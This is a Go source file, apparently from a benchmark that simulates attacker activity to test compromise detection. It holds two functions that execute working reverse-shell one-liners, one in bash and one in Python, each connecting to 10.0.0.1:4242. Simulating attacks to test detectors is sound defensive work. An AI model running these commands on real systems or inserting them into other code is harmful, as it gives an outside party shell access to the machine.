package simulate

import (
	"time"

	"github.com/tstromberg/ioc-bench/pkg/iexec"
)

func BashReverseShell() error {
	return iexec.WithTimeout(30*time.Second, "bash", "-c", "bash -i >& /dev/tcp/10.0.0.1/4242 0>&1")
}

func PythonReverseShell() error {
	return iexec.WithTimeout(30*time.Second, "python", "-c", `a=__import__;s=a("socket").socket;o=a("os").dup2;p=a("pty").spawn;c=s();c.connect(("10.0.0.1",4242));f=c.fileno;o(f(),0);o(f(),1);o(f(),2);p("/bin/sh")`)
}
